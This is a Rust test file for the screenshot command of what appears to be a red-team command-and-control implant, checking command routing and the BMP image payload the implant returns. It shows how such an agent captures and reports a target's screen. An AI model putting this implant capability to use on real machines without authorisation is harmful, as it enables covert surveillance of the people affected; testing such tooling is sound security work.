use std::collections::HashMap;

use red_cell_common::demon::{DemonCommand, DemonPackage};

use super::super::screenshot::handle_screenshot;
use super::super::{DispatchResult, MemFileStore, dispatch};
use crate::config::SpecterConfig;
use crate::download::DownloadTracker;
use crate::job::JobStore;
use crate::token::TokenVault;

// ── CommandScreenshot (2510) ────────────────────────────────────────────

#[test]
fn screenshot_returns_respond_with_correct_command_id() {
    let result = handle_screenshot();
    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond");
    };
    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandScreenshot));
}

#[test]
fn screenshot_response_starts_with_success_flag() {
    let result = handle_screenshot();
    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond");
    };
    // On non-Windows (CI) the stub returns None → success=0.
    // On Windows the GDI call should succeed → success=1.
    assert!(resp.payload.len() >= 4, "payload must contain at least the success flag");
    let success = u32::from_le_bytes(resp.payload[..4].try_into().unwrap());
    if cfg!(windows) {
        assert_eq!(success, 1, "screenshot must succeed on Windows");
        // Verify the image bytes are present after the success flag.
        assert!(resp.payload.len() > 8, "payload must contain image data");
        let img_len = u32::from_le_bytes(resp.payload[4..8].try_into().unwrap());
        assert!(img_len > 0, "image length must be non-zero");
        assert_eq!(
            resp.payload.len(),
            8 + img_len as usize,
            "payload length must match header + image bytes"
        );
        // BMP magic: first two bytes of image data should be 'BM'.
        assert_eq!(resp.payload[8], b'B', "BMP magic byte 0");
        assert_eq!(resp.payload[9], b'M', "BMP magic byte 1");
    } else {
        assert_eq!(success, 0, "screenshot must fail on non-Windows stub");
        assert_eq!(resp.payload.len(), 4, "failure payload is just the flag");
    }
}

#[test]
fn screenshot_dispatch_routes_correctly() {
    let pkg = DemonPackage {
        command_id: u32::from(DemonCommand::CommandScreenshot),
        request_id: 99,
        payload: Vec::new(),
    };
    let mut config = SpecterConfig::default();
    let mut vault = TokenVault::new();
    let mut downloads = DownloadTracker::default();
    let mut mem_files = MemFileStore::new();
    let result = dispatch(
        &pkg,
        &mut config,
        &mut vault,
        &mut downloads,
        &mut mem_files,
        &mut JobStore::new(),
        &mut Vec::new(),
        &crate::coffeeldr::new_bof_output_queue(),
    );
    let DispatchResult::Respond(resp) = result else {
        panic!("expected Respond");
    };
    assert_eq!(resp.command_id, u32::from(DemonCommand::CommandScreenshot));
}

#[test]
fn dispatch_routes_command_screenshot() {
    let mut config = SpecterConfig::default();
    let package = DemonPackage::new(DemonCommand::CommandScreenshot, 1, vec![]);
    let result = dispatch(
        &package,
        &mut config,
        &mut TokenVault::new(),
        &mut DownloadTracker::new(),
        &mut HashMap::new(),
        &mut JobStore::new(),
        &mut Vec::new(),
        &crate::coffeeldr::new_bof_output_queue(),
    );
    assert!(matches!(result, DispatchResult::Respond(_)));
}
